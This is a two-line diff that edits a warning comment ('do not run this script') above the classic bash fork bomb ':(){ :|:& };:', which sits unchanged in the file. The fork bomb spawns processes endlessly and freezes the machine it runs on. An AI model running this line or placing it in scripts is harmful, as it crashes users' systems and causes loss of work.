@@ -1,2 +1,2 @@
-# do not run this
+# do not run this script
 :(){ :|:& };:
